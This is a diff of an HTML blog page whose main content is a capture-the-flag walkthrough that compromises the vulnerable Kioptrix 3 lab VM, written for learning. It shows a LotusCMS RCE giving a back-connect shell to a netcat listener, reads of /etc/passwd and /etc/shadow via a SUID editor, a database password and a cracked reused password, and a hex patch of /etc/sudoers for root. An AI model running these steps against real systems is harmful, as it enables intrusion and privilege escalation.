@@ -1,14 +1,22 @@
 
 <head>
-
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta http-equiv="Content-Type" content="text/html" charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <script>
+        // UNCOMMENT AND USE YOUR VARIABLES FOR DISQUS AND GOOGLE ANALYTICS
+        // var d_id  = '',
+        //     g_id  = 'UA-XXXXXXXX-X', // Format: UA-########-#, Example: UA-11220899-1
+        //     g_url = 'XXXXXXX.XXX' // Format: #####.####, Example: webdesignporto.com
+    </script>
 
     <title>Kioptrix: Level 1.2 (#3) Walkthrough</title>
+
     <meta name="HandheldFriendly" content="True">
+    <meta name="MobileOptimized" content="320">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-    <link rel="stylesheet" type="text/css" href="../assets/built/screen.css?v=398b9cd8b3">
+    <link rel="stylesheet" type="text/css" href="../assets/highlighter/prettify.css?v=d84a20ab2f">
+    <link rel="stylesheet" type="text/css" href="../assets/css/screen.css?v=d84a20ab2f">
 
     <link rel="shortcut icon" href="../favicon.ico" type="image/x-icon">
     <link rel="canonical" href="index.html">
@@ -22,7 +30,7 @@
     <meta property="og:url" content="http://localhost:2368/kioptrix-walkthrough-3/">
     <meta property="og:image" content="http://localhost:2368/content/images/2018/07/Kioptrix-3-Cover.jpeg">
     <meta property="article:published_time" content="2017-09-12T04:49:33.000Z">
-    <meta property="article:modified_time" content="2018-07-30T07:13:06.000Z">
+    <meta property="article:modified_time" content="2018-07-30T08:07:38.000Z">
     <meta property="article:tag" content="Boot2Root">
     <meta property="article:tag" content="VulnHub">
     <meta property="article:tag" content="OSCP">
@@ -49,12 +57,7 @@
     "publisher": {
         "@type": "Organization",
         "name": "rootshellz",
-        "logo": {
-            "@type": "ImageObject",
-            "url": "http://localhost:2368/favicon.ico",
-            "width": 60,
-            "height": 60
-        }
+        "logo": "http://localhost:2368/content/images/2018/07/Blog-Logo.png"
     },
     "author": {
         "@type": "Person",
@@ -73,7 +76,7 @@
     "headline": "Kioptrix: Level 1.2 (#3) Walkthrough",
     "url": "http://localhost:2368/kioptrix-walkthrough-3/",
     "datePublished": "2017-09-12T04:49:33.000Z",
-    "dateModified": "2018-07-30T07:13:06.000Z",
+    "dateModified": "2018-07-30T08:07:38.000Z",
     "image": {
         "@type": "ImageObject",
         "url": "http://localhost:2368/content/images/2018/07/Kioptrix-3-Cover.jpeg",
@@ -89,7 +92,7 @@
 }
     </script>
 
-    <script src="../public/ghost-sdk.js?v=398b9cd8b3"></script>
+    <script src="../public/ghost-sdk.js?v=d84a20ab2f"></script>
 <script>
 ghost.init({
 	clientId: "ghost-frontend",
@@ -111,61 +114,44 @@ ghost.init({
 
 </script>
 
+    <script>
+      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+      })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+      ga('create', g_id, g_url);
+      ga('send', 'pageview');
+
+    </script>
 </head>
 <body class="post-template tag-boot2root tag-vulnhub tag-oscp tag-kioptrix">
 
-    <div class="site-wrapper">
+    
 
-        
+<main class="content" role="main">
 
-<header class="site-header outer">
-    <div class="inner">
-        <nav class="site-nav">
-    <div class="site-nav-left">
-                <a class="site-nav-logo" href="../">rootshellz</a>
-            <ul class="nav" role="menu">
-    <li class="nav-home" role="menuitem"><a href="../">Home</a></li>
-</ul>
+    <article class="post tag-boot2root tag-vulnhub tag-oscp tag-kioptrix">
 
-    </div>
-    <div class="site-nav-right">
-        <div class="social-links">
-                <a class="social-link social-link-tw" href="https://twitter.com/rootshellz" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"></path></svg>
-</a>
-        </div>
-            <a class="rss-button" href="https://feedly.com/i/subscription/feed/http://localhost:2368/rss/" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24"><circle cx="6.18" cy="17.82" r="2.18"></circle><path d="M4 4.44v2.83c7.03 0 12.73 5.7 12.73 12.73h2.83c0-8.59-6.97-15.56-15.56-15.56zm0 5.66v2.83c3.9 0 7.07 3.17 7.07 7.07h2.83c0-5.47-4.43-9.9-9.9-9.9z"></path></svg>
-</a>
-    </div>
-</nav>
-    </div>
-</header>
+        <header class="post-header">
+            <a id="blog-logo" href="../">
+                    <img src="../content/images/2018/07/Blog-Logo.png" alt="Blog Logo">
+            </a>
+        </header>
 
 
-<main id="site-main" class="site-main outer">
-    <div class="inner">
+        <span class="post-meta"><time datetime="2017-09-11">11 Sep 2017</time> on <a href="../tag/boot2root/">Boot2Root</a> | <a href="../tag/vulnhub/">VulnHub</a> | <a href="../tag/oscp/">OSCP</a> | <a href="../tag/kioptrix/">Kioptrix</a></span>
 
-        <article class="post-full post tag-boot2root tag-vulnhub tag-oscp tag-kioptrix ">
+        <h1 class="post-title">Kioptrix: Level 1.2 (#3) Walkthrough</h1>
 
-            <header class="post-full-header">
-                <section class="post-full-meta">
-                    <time class="post-full-meta-date" datetime="2017-09-11">11 September 2017</time>
-                        <span class="date-divider">/</span> <a href="../tag/boot2root/">Boot2Root</a>
-                </section>
-                <h1 class="post-full-title">Kioptrix: Level 1.2 (#3) Walkthrough</h1>
-            </header>
-
-            <figure class="post-full-image" style="background-image: url(../content/images/2018/07/Kioptrix-3-Cover.jpeg)">
-            </figure>
-
-            <section class="post-full-content">
-                <div class="post-content">
-                    <div class="kg-card-markdown"><h1 id="intro">Intro</h1>
+        <section class="post-content">
+            <div class="kg-card-markdown"><h1 id="intro">Intro</h1>
 <p>Today I will be continuing on the the <a href="http://www.kioptrix.com/blog/test-page/">Kioptrix series</a> of vulnerable VMs.  In previous posts, I covered <a href="https://blog.rootshellz.com/kioptrix-walkthrough-1/">Kioptrix1</a> and <a href="https://blog.rootshellz.com/kioptrix-walkthrough-2/">Kioptrix1.1</a>.</p>
 <p>Per the author of the challenge, "The same as the others, there’s more then one way to “pwn” this one. There’s easy and not so easy."  So let's see if we can find both, shall we?</p>
 <h1 id="setup">Setup</h1>
 <p>The challenge description and Readme file tells us that in addition to spinning up the VM and letting DHCP assign it an address, we also need to point <strong>kioptrix3.com</strong> to the VM's IP.  The Readme also confirms this is another web challenge, which makes sense given the required name mapping.  Let's spin up the VM, find it on the network, and then point the domain name via our Kali attack box's hosts file.</p>
 <p>We use an nmap Ping scan of our local subnet to identify the target.</p>
-<pre><code>root@kali:~# nmap -T4 -sn 172.16.2.0/24
+<pre><code class="language-shell-output">root@kali:~# nmap -T4 -sn 172.16.2.0/24
 
 Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2017-08-30 23:01 PDT
 Nmap scan report for 172.16.2.1
@@ -183,12 +169,12 @@ Nmap done: 256 IP addresses (4 hosts up) scanned in 12.86 seconds
 </code></pre>
 <p>Process of elimination of the know addresses means 172.16.2.132 is our target.</p>
 <p>Per the Readme, let's point kioptrix3.com to 172.16.2.132:</p>
-<pre><code>root@kali:~# echo "172.16.2.132  kioptrix3.com" &gt;&gt; /etc/hosts
+<pre><code class="language-shell-output">root@kali:~# echo "172.16.2.132  kioptrix3.com" &gt;&gt; /etc/hosts
 </code></pre>
 <h1 id="initialscanningandenumeration">Initial Scanning and Enumeration</h1>
 <p>With out target identified and name resolution set up, let's move on to initial scanning of the VM.</p>
 <p>TCP scanning:</p>
-<pre><code>root@kali:~# nmap -T4 -Pn -sV -O -p- kioptrix3.com
+<pre><code class="language-shell-output">root@kali:~# nmap -T4 -Pn -sV -O -p- kioptrix3.com
 
 Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2017-08-30 23:08 PDT
 Nmap scan report for kioptrix3.com (172.16.2.132)
@@ -209,7 +195,7 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 9.10 seconds
 </code></pre>
 <p>UDP scanning:</p>
-<pre><code>root@kali:~# nmap -T4 -Pn -sU --top-ports 200 -sV -O 172.16.2.132
+<pre><code class="language-shell-output">root@kali:~# nmap -T4 -Pn -sU --top-ports 200 -sV -O 172.16.2.132
 
 Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2017-08-30 23:09 PDT
 Nmap scan report for kioptrix3.com (172.16.2.132)
@@ -224,7 +210,7 @@ Nmap done: 1 IP address (1 host up) scanned in 307.11 seconds
 </code></pre>
 <p>Not much to work with, but at least we know where to focus our effort.</p>
 <p>Deeper Apache enumeration with relevant nmap scripts:</p>
-<pre><code>root@kali:~# nmap -T4 -Pn -p 80 --script=http-apache-negotiation.nse,http-apache-server-status.nse,http-backup-finder.nse,http-coldfusion-subzero.nse,http-comments-displayer.nse,http-config-backup.nse,http-csrf.nse,http-default-accounts.nse,http-devframework.nse,http-dombased-xss.nse,http-drupal-enum.nse,http-drupal-enum-users.nse,http-enum.nse,http-git.nse,http-headers.nse,http-iis-short-name-brute.nse,http-iis-webdav-vuln.nse,http-mcmp.nse,http-methods.nse,http-method-tamper.nse,http-mobileversion-checker.nse,http-open-proxy.nse,http-open-redirect.nse,http-passwd.nse,http-phpmyadmin-dir-traversal.nse,http-phpself-xss.nse,http-php-version.nse,http-proxy-brute.nse,http-robots.txt.nse,http-shellshock.nse,http-sitemap-generator.nse,http-sql-injection.nse,http-stored-xss.nse,http-title.nse,http-unsafe-output-escaping.nse,http-userdir-enum.nse,http-vhosts.nse,http-vuln-cve2006-3392.nse,http-vuln-cve2009-3960.nse,http-vuln-cve2010-0738.nse,http-vuln-cve2010-2861.nse,http-vuln-cve2011-3192.nse,http-vuln-cve2011-3368.nse,http-vuln-cve2012-1823.nse,http-vuln-cve2013-0156.nse,http-vuln-cve2013-6786.nse,http-vuln-cve2013-7091.nse,http-vuln-cve2014-2126.nse,http-vuln-cve2014-2127.nse,http-vuln-cve2014-2128.nse,http-vuln-cve2014-2129.nse,http-vuln-cve2014-3704.nse,http-vuln-cve2014-8877.nse,http-vuln-cve2015-1427.nse,http-vuln-cve2015-1635.nse,http-waf-detect.nse,http-waf-fingerprint.nse,http-webdav-scan.nse,http-wordpress-enum.nse,http-wordpress-users.nse,http-xssed.nse,membase-http-info.nse,rmi-vuln-classloader.nse 172.16.2.132
+<pre><code class="language-shell-output">root@kali:~# nmap -T4 -Pn -p 80 --script=http-apache-negotiation.nse,http-apache-server-status.nse,http-backup-finder.nse,http-coldfusion-subzero.nse,http-comments-displayer.nse,http-config-backup.nse,http-csrf.nse,http-default-accounts.nse,http-devframework.nse,http-dombased-xss.nse,http-drupal-enum.nse,http-drupal-enum-users.nse,http-enum.nse,http-git.nse,http-headers.nse,http-iis-short-name-brute.nse,http-iis-webdav-vuln.nse,http-mcmp.nse,http-methods.nse,http-method-tamper.nse,http-mobileversion-checker.nse,http-open-proxy.nse,http-open-redirect.nse,http-passwd.nse,http-phpmyadmin-dir-traversal.nse,http-phpself-xss.nse,http-php-version.nse,http-proxy-brute.nse,http-robots.txt.nse,http-shellshock.nse,http-sitemap-generator.nse,http-sql-injection.nse,http-stored-xss.nse,http-title.nse,http-unsafe-output-escaping.nse,http-userdir-enum.nse,http-vhosts.nse,http-vuln-cve2006-3392.nse,http-vuln-cve2009-3960.nse,http-vuln-cve2010-0738.nse,http-vuln-cve2010-2861.nse,http-vuln-cve2011-3192.nse,http-vuln-cve2011-3368.nse,http-vuln-cve2012-1823.nse,http-vuln-cve2013-0156.nse,http-vuln-cve2013-6786.nse,http-vuln-cve2013-7091.nse,http-vuln-cve2014-2126.nse,http-vuln-cve2014-2127.nse,http-vuln-cve2014-2128.nse,http-vuln-cve2014-2129.nse,http-vuln-cve2014-3704.nse,http-vuln-cve2014-8877.nse,http-vuln-cve2015-1427.nse,http-vuln-cve2015-1635.nse,http-waf-detect.nse,http-waf-fingerprint.nse,http-webdav-scan.nse,http-wordpress-enum.nse,http-wordpress-users.nse,http-xssed.nse,membase-http-info.nse,rmi-vuln-classloader.nse 172.16.2.132
 
 Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2017-08-30 23:20 PDT
 Nmap scan report for kioptrix3.com (172.16.2.132)
@@ -518,16 +504,16 @@ Nmap done: 1 IP address (1 host up) scanned in 3.70 seconds
 <p>The <a href="https://github.com/Hood3dRob1n/LotusCMS-Exploit">repo</a> contains both <a href="https://github.com/Hood3dRob1n/LotusCMS-Exploit/blob/master/lotusRCE.sh">Bash</a> and <a href="https://github.com/Hood3dRob1n/LotusCMS-Exploit/blob/master/lotusRCE.rb">Ruby</a> stand-alone exploitation scripts.  Thanks <a href="https://github.com/Hood3dRob1n">Hood3dRob1n</a>!  Let's go for the Bash script...  After a quick review, we verify that the script is safe to run and understand its functionality.  When run, the script will check that we have a vulnerable target, ask us to select from a menu of payloads, and then run the exploit.  Interestingly, it appears Hood3dRob1n wrote this script with Kioptrix #3 (1.2) in mind.</p>
 <h2 id="exploitingtherce">Exploiting the RCE</h2>
 <p>We start our listener:</p>
-<pre><code>root@kali:~# nc -vvlp 1337
+<pre><code class="language-shell-output">root@kali:~# nc -vvlp 1337
 listening on [any] 1337 ...
 </code></pre>
 <p>Then run the sploit:</p>
-<pre><code>root@kali:~# ./lotusRCE.sh
+<pre><code class="language-shell-output">root@kali:~# ./lotusRCE.sh
 USAGE: ./lotusRCE.sh target LotusCMS_path
 EX: ./lotusRCE.sh 192.168.1.36 /lcms/
 EX: ./lotusRCE.sh ki0ptrix3.com /
 </code></pre>
-<pre><code>root@kali:~# ./lotusRCE.sh kioptrix3.com /
+<pre><code class="language-shell-output">root@kali:~# ./lotusRCE.sh kioptrix3.com /
 Path found, now to check for vuln....
 
 &lt;/html&gt;Hood3dRob1n
@@ -545,7 +531,7 @@ OK, open your local listener and choose the method for back connect:
 #? 1
 </code></pre>
 <p>Flipping back to our listener:</p>
-<pre><code>root@kali:~# nc -vvlp 1337
+<pre><code class="language-shell-output">root@kali:~# nc -vvlp 1337
 listening on [any] 1337 ...
 connect to [172.16.2.129] from kioptrix3.com [172.16.2.132] 35306
 
@@ -563,7 +549,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 <h2 id="localenumeration">Local Enumeration</h2>
 <p>I could accomplish this step using my Linux enumeration script, but let's have a go by hand.  If we can't find any low hanging fruit, we will fall back to the more thorough script.</p>
 <p>We first need to see what we are working with:</p>
-<pre><code>uname -a
+<pre><code class="language-shell-output">uname -a
 Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 GNU/Linux
 
 cat /etc/*release*
@@ -573,7 +559,7 @@ DISTRIB_CODENAME=hardy
 DISTRIB_DESCRIPTION="Ubuntu 8.04.3 LTS"
 </code></pre>
 <p>From here, let's see what users we have on the system:</p>
-<pre><code>cat /etc/passwd
+<pre><code class="language-shell-output">cat /etc/passwd
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/bin/sh
 bin:x:2:2:bin:/bin:/bin/sh
@@ -630,7 +616,7 @@ loneferret       pts/1    192.168.1.106    Sat Apr 16 08:51:58 -0400 2011
 dreg                                       **Never logged in**
 </code></pre>
 <p>Besides root, it looks like loneferret is the only other user to have accessed the system.  Let's see what he has been up to:</p>
-<pre><code>ls -la /home/loneferret
+<pre><code class="language-shell-output">ls -la /home/loneferret
 total 64
 drwxr-xr-x 3 loneferret loneferret  4096 Apr 17  2011 .
 drwxr-xr-x 5 root       root        4096 Apr 16  2011 ..
@@ -677,7 +663,7 @@ For more information, see:
   http://www.trapkit.de/tools/checksec.html
 </code></pre>
 <p>Well, that is all very interesting.  We have a couple of references to the <em>ht</em> application as well as a script, that per the [link](<a href="http://www.trapkit.de/tools/checksec.html">http://www.trapkit.de/tools/checksec.html</a> from the help dialogue, "is designed to test what standard Linux OS and PaX security features are being used."  On a hunch, what if we check the security on the the ht executable?</p>
-<pre><code>which ht
+<pre><code class="language-shell-output">which ht
 /usr/local/bin/ht
 
 ls -l /usr/local/bin/ht
@@ -689,7 +675,7 @@ ht 2.0.18 (POSIX) 07:26:02 on Apr 16 2011
 (c) 1999-2009 Sebastian Biallas &lt;sb@biallas.net&gt;
 </code></pre>
 <p>First, we notice the file is owned by root and has the SUID bit set along with word-executable permissions.  This means that anyone can run this executable file and when they do, it will assume the effective UID of root (0).  Given that this appears to be an editor, I think we have found our way in.</p>
-<pre><code>ht /etc/shadow
+<pre><code class="language-shell-output">ht /etc/shadow
 
 python -c 'import pty; pty.spawn("/bin/sh")'
 
@@ -713,7 +699,7 @@ sudo -l
 <h2 id="localenumerationpt2">Local Enumeration Pt. 2</h2>
 <p>We have a shell as the <em>www-data</em> user, which means we should have full control of the web application that we compromised.  We didn't spend too much time enumerating the web app before we found the PHP exploit, so it's possible there is other functionality at play.  We now have the advantage of auditing the web app from the inside.</p>
 <p>On a hunch, let's try for a quick and easy win:</p>
-<pre><code>$ pwd
+<pre><code class="language-shell-output">$ pwd
 pwd
 /home/www/kioptrix3.com
 $ 
@@ -750,7 +736,7 @@ grep gallarific_mysql ./*/*
 [... snip ...]
 </code></pre>
 <p>Hmm, that seems helpful.  Let's see what is stored in the DB:</p>
-<pre><code>$ mysql -u root -p
+<pre><code class="language-shell-output">$ mysql -u root -p
 mysql -u root -p
 Enter password: fuckeyou
 
@@ -818,7 +804,7 @@ select * from gallarific_users;
 <p>Awesome, <a href="https://crackstation.net/">CrackStation</a> was able to easily crack loneferret's password.</p>
 <h2 id="becomingloneferret">Becoming loneferret</h2>
 <p>We now have the lonferret user's Gallerific web application password, but that doesn't seem to help us much in getting root on the box.  However, maybe the user reused the same password for his local account on the server.  Let's find out:</p>
-<pre><code>root@kali:~# ssh loneferret@172.16.2.132
+<pre><code class="language-shell-output">root@kali:~# ssh loneferret@172.16.2.132
 loneferret@172.16.2.132's password: [starwars]
 Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686
 [... snip ...]
@@ -839,7 +825,7 @@ User loneferret may run the following commands on this host:
 <p>Since ht is an editor and we are able to use it to edit any file as root, we have a lot of options here for privilege escalation.  We can now access /etc/shadow by running <code>sudo ht /etc/shadow</code>, but let's try something else instead.  We will go after sudo itself.</p>
 <p>From our enumeration, we know there are entries in the /etc/sudoers for the loneferret user.  To get root, we will update /etc/sudoers to allow us to run everything with sudo, including su (i.e. <code>sudo su -</code>).</p>
 <p>Let's edit the file:</p>
-<pre><code>loneferret@Kioptrix3:~$ ls -l /etc/sudoers
+<pre><code class="language-shell-output">loneferret@Kioptrix3:~$ ls -l /etc/sudoers
 -r--r----- 1 root root 614 2017-09-10 20:29 /etc/sudoers
 
 loneferret@Kioptrix3:~$ cat /etc/sudoers
@@ -856,14 +842,14 @@ loneferret@Kioptrix3:~$ ht /etc/sudoers
 <p>Even though we shouldn't have permission to read the sudoers file, using the setuid / setgid ht executable, we are able to load the file.<br>
 <img src="../content/images/2017/09/ht-sudoers-before.png" alt="ht-sudoers-before"></p>
 <p>Now let's do some hex patching.  We want to change</p>
-<pre><code>│00000130 65 66 65 72 72 65 74 20-41 4c 4c 3d 4e 4f 50 41 |eferret ALL=NOPA|│
+<pre><code class="language-hexdump">│00000130 65 66 65 72 72 65 74 20-41 4c 4c 3d 4e 4f 50 41 |eferret ALL=NOPA|│
 │00000140 53 53 57 44 3a 20 21 2f-75 73 72 2f 62 69 6e 2f |SSWD: !/usr/bin/|│
 │00000150 73 75 2c 20 2f 75 73 72-2f 6c 6f 63 61 6c 2f 62 |su, /usr/local/b|│
 │00000160 69 6e 2f 68 74 0a 0a 23-20 55 6e 63 6f 6d 6d 65 |in/ht??# Uncomme||
 </code></pre>
 <p><code>loneferret ALL=NOPASSWD: !/usr/bin/su, /usr/local/bin/ht</code></p>
 <p>to</p>
-<pre><code>│00000130 65 66 65 72 72 65 74 20-41 4c 4c 3d 28 41 4c 4c |eferret ALL=(ALL|│
+<pre><code class="language-hexdump">│00000130 65 66 65 72 72 65 74 20-41 4c 4c 3d 28 41 4c 4c |eferret ALL=(ALL|│
 │00000140 29 20 41 4c 4c 0a 23 2f-75 73 72 2f 62 69 6e 2f |) ALL?#/usr/bin/|│
 │00000150 73 75 2c 20 2f 75 73 72-2f 6c 6f 63 61 6c 2f 62 |su, /usr/local/b|│
 │00000160 69 6e 2f 68 74 0a 0a 23-20 55 6e 63 6f 6d 6d 65 |in/ht??# Uncomme|│
@@ -874,7 +860,7 @@ loneferret@Kioptrix3:~$ ht /etc/sudoers
 <p>Let's make the change and save the file using ht:<br>
 <img src="../content/images/2017/09/ht-sudoers-after.png" alt="ht-sudoers-after"></p>
 <p>After saving the file, let's see if we win:</p>
-<pre><code>loneferret@Kioptrix3:~$ sudo -l
+<pre><code class="language-shell-output">loneferret@Kioptrix3:~$ sudo -l
 [sudo] password for loneferret: 
 User loneferret may run the following commands on this host:
     (ALL) ALL
@@ -891,7 +877,7 @@ root@Kioptrix3:~#
 <p>Woot, woot!  There is is, we have a root shell on our target!</p>
 <h1 id="enumeratinggoodies">Enumerating Goodies</h1>
 <p>Now that we are root, let's see what we can find on the box:</p>
-<pre><code>root@Kioptrix3:~# cd /root
+<pre><code class="language-shell-output">root@Kioptrix3:~# cd /root
 
 root@Kioptrix3:~# ls -l
 total 16
@@ -944,215 +930,66 @@ public domain I used them.
 </code></pre>
 <h1 id="conclusion">Conclusion</h1>
 <p>Well, that's it for this challenge.  However, looking back on where we ended up, I am almost certain there are other ways to crack this VM.  For example, I imagine there is a SQL injection I missed on the web application that would have led us to the loneferret password hash in the database without first exploiting the LotusCMS RCE vulnerability.  I might go back and try to find this later.  Alternatively if there was another way to find the loneferret username, an SSH brute force using the rockyou password list would have been successful:</p>
-<pre><code>root@kali:~# grep ^starwars$ /usr/share/wordlists/rockyou.txt 
+<pre><code class="language-shell-output">root@kali:~# grep ^starwars$ /usr/share/wordlists/rockyou.txt 
 starwars
 </code></pre>
 <p>This just goes to show, both on challenge VMs and real world servers, there is usually more than one way to pop the box.</p>
 <p>Until next time, stay root my friends!</p>
 </div>
-                </div>
+        </section>
+        
+        <div id="disqus_thread"></div>
+        <script type="text/javascript">
+            var disqus_shortname = d_id; 
+        
+            /* * * DON'T EDIT BELOW THIS LINE * * */
+            (function() {
+                var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+                dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+            })();
+        </script>
+        <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+        <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+        
+
+        <footer class="post-footer">
+
+                <section class="author">
+                    <h4>rootshellz</h4>
+                    <p></p>
+                </section>
+
+            <section class="share">
+                <h4>Share this</h4>
+                <a class="icon-twitter" href="http://twitter.com/share?text=Kioptrix:%20Level%201.2%20(#3)%20Walkthrough&amp;url=http://localhost:2368/kioptrix-walkthrough-3/" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                    <span class="hidden">Twitter</span>
+                </a>
+                <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:2368/kioptrix-walkthrough-3/" onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+                    <span class="hidden">Facebook</span>
+                </a>
+                <a class="icon-google-plus" href="https://plus.google.com/share?url=http://localhost:2368/kioptrix-walkthrough-3/" onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+                    <span class="hidden">Google+</span>
+                </a>
             </section>
 
-
-            <footer class="post-full-footer">
-
-
-                    
-<section class="author-card">
-        <img class="author-profile-image" src="../content/images/2018/07/rootshellz.jpg" alt="rootshellz">
-    <section class="author-card-content">
-        <h4 class="author-card-name"><a href="../author/rootshellz/">rootshellz</a></h4>
-            <p>Read <a href="../author/rootshellz/">more posts</a> by this author.</p>
-    </section>
-</section>
-<div class="post-full-footer-right">
-    <a class="author-card-button" href="../author/rootshellz/">Read More</a>
-</div>
+        </footer>
 
 
-            </footer>
+    </article>
 
-
-        </article>
-
-    </div>
 </main>
 
-<aside class="read-next outer">
-    <div class="inner">
-        <div class="read-next-feed">
-                <article class="read-next-card" style="background-image: url(http://localhost:2368/content/images/2018/07/Blog-Banner-1.png)">
-                    <header class="read-next-card-header">
-                        <small class="read-next-card-header-sitetitle">— rootshellz —</small>
-                        <h3 class="read-next-card-header-title"><a href="../tag/boot2root/">Boot2Root</a></h3>
-                    </header>
-                    <div class="read-next-divider"><svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24"><path d="M13 14.5s2 3 5 3 5.5-2.463 5.5-5.5S21 6.5 18 6.5c-5 0-7 11-12 11C2.962 17.5.5 15.037.5 12S3 6.5 6 6.5s4.5 3.5 4.5 3.5"></path></svg>
-</div>
-                    <div class="read-next-card-content">
-                        <ul>
-                            <li><a href="../kioptrix-walkthrough-2/">Kioptrix: Level 1.1 (#2) Walkthrough</a></li>
-                            <li><a href="../kioptrix-walkthrough-1/">Kioptrix: Level 1 (#1) Walkthrough</a></li>
-                        </ul>
-                    </div>
-                    <footer class="read-next-card-footer">
-                        <a href="../tag/boot2root/">See all 2 posts →</a>
-                    </footer>
-                </article>
-
-
-                <article class="post-card post tag-boot2root tag-vulnhub tag-oscp tag-kioptrix">
-        <a class="post-card-image-link" href="../kioptrix-walkthrough-2/">
-            <div class="post-card-image" style="background-image: url(../content/images/2018/07/Kioptrix-2-Cover.jpg)"></div>
-        </a>
-    <div class="post-card-content">
-        <a class="post-card-content-link" href="../kioptrix-walkthrough-2/">
-            <header class="post-card-header">
-                    <span class="post-card-tags">Boot2Root</span>
-                <h2 class="post-card-title">Kioptrix: Level 1.1 (#2) Walkthrough</h2>
-            </header>
-            <section class="post-card-excerpt">
-                <p>Intro In this post, I will continue hacking on the Kioptrix series of VMs.  In the last post, I covered Kioptrix1.  In this post, I will be working my way through Kioptrix1.1,</p>
-            </section>
-        </a>
-        <footer class="post-card-meta">
-
-            <ul class="author-list">
-                <li class="author-list-item">
-
-                    <div class="author-name-tooltip">
-                        rootshellz
-                    </div>
-
-                        <a href="../author/rootshellz/" class="static-avatar"><img class="author-profile-image" src="../content/images/2018/07/rootshellz.jpg" alt="rootshellz"></a>
-                </li>
-            </ul>
-
-            <span class="reading-time">23 min read</span>
-
-        </footer>
-    </div>
-</article>
-
+    <footer class="site-footer">
+        <!-- <a class="subscribe icon-feed" href="http://localhost:2368/rss/"><span class="tooltip">Subscribe!</span></a> -->
+        <div class="inner">
+             <section class="copyright">All content copyright <a href="../">rootshellz</a> © 2018 • All rights reserved.</section>
+             <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://ghost.org"><span class="icon-ghost-text">Ghost</span></a> in <a href="https://github.com/mityalebedev/The-Shell">The Shell</a> theme.</section>
         </div>
-    </div>
-</aside>
-
-<div class="floating-header">
-    <div class="floating-header-logo">
-        <a href="../">
-            <span>rootshellz</span>
-        </a>
-    </div>
-    <span class="floating-header-divider">—</span>
-    <div class="floating-header-title">Kioptrix: Level 1.2 (#3) Walkthrough</div>
-    <div class="floating-header-share">
-        <div class="floating-header-share-label">Share this <svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24">
-    <path d="M7.5 15.5V4a1.5 1.5 0 1 1 3 0v4.5h2a1 1 0 0 1 1 1h2a1 1 0 0 1 1 1H18a1.5 1.5 0 0 1 1.5 1.5v3.099c0 .929-.13 1.854-.385 2.748L17.5 23.5h-9c-1.5-2-5.417-8.673-5.417-8.673a1.2 1.2 0 0 1 1.76-1.605L7.5 15.5zm6-6v2m-3-3.5v3.5m6-1v2"></path>
-</svg>
-</div>
-        <a class="floating-header-share-tw" href="https://twitter.com/share?text=Kioptrix%3A%20Level%201.2%20(%233)%20Walkthrough&amp;url=http://localhost:2368/kioptrix-walkthrough-3/" onclick="window.open(this.href, 'share-twitter', 'width=550,height=235');return false;">
